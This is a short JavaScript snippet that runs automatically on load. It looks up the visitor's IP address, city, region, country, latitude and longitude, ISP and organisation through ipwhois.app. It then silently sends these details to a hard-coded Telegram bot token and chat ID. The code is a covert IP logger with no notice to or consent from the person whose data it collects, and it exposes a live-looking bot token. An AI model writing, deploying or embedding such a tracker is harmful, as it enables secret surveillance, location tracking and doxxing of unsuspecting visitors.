let bot = {
TOKEN: "5460302893:AAEzCgjK4HiUv0esI9cOeJBKDhqPyyeTvYU",
chatID: "1583776320",
}

const api_url = 'https://ipwhois.app/json/?objects=ip,country,region,city,latitude,longitude,org,isp,timezone_gmt'
async function getISS() {
	const response = await fetch(api_url);
	const data = await response.json();
	var my_text = `1X96:%0A - IP Address: ${data.ip} %0A - City: ${data.city} %0A - State: ${data.region} %0A - Country: ${data.country} %0A - Time Zone: ${data.timezone_gmt} %0A - Latitude: ${data.latitude} %0A - Longitude: ${data.longitude} %0A - Internet Service Provider: ${data.isp} %0A - Organization: ${data.org}`

	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
	method: "GET"
})
}

getISS();